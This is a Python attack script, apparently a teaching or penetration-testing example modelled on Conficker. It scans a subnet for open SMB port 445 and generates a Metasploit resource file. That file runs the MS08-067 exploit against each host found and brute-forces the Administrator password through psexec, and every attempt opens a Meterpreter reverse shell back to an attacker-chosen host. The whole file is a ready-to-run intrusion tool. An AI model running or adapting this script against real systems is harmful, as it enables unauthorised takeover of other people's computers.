import os
import argparse
import sys
import nmap


def findTgts(subNet):
    nmScan = nmap.PortScanner()
    nmScan.scan(subNet, '445')
    tgtHosts = []
    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(445):
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print('[+] Found Target Host: ' + host)
                tgtHosts.append(host)
    return tgtHosts


def setupHandler(configFile, lhost, lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set payload windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')


def confickerExploit(configFile,tgtHost,lhost,lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + str(tgtHost) + '\n')
    configFile.write('set payload windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')


def smbBrute(configFile,tgtHost,passwdFile,lhost,lport):
    username = 'Administrator'
    pF = open(passwdFile, 'r')
    for password in pF.readlines():
        password = password.strip('\n').strip('\r')
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser ' + str(username) + '\n')
        configFile.write('set SMBPass ' + str(password) + '\n')
        configFile.write('set RHOST ' + str(tgtHost) + '\n')
        configFile.write('set payload windows/meterpreter/reverse_tcp\n')
        configFile.write('set LPORT ' + str(lport) + '\n')
        configFile.write('set LHOST ' + lhost + '\n')
        configFile.write('exploit -j -z\n')


def main():
    configFile = open('meta.rc', 'w')

    parser = argparse.ArgumentParser(description='!conficker!')
    parser.add_argument('-H', dest='tgtHost', type=str, help='specify the target address[es]',required=True)
    parser.add_argument('-p', dest='lport', type=str, help='specify the listen port')
    parser.add_argument('-l', dest='lhost', type=str, help='specify the listen address',required=True)
    parser.add_argument('-F', dest='passwdFile', type=str, help='password file for SMB brute force attempt')

    args = parser.parse_args()

    lhost = args.lhost
    lport = args.lport
    if lport == None:
        lport = '1337'
    passwdFile = args.passwdFile
    tgtHosts = findTgts(args.tgtHost)

    setupHandler(configFile, lhost, lport)

    for tgtHost in tgtHosts:
        confickerExploit(configFile, tgtHost, lhost, lport)
        if passwdFile != None:
            smbBrute(configFile,tgtHost,passwdFile,lhost,lport)

    configFile.close()
    os.system('msfconsole -r meta.rc')


if __name__ == '__main__':
    main()
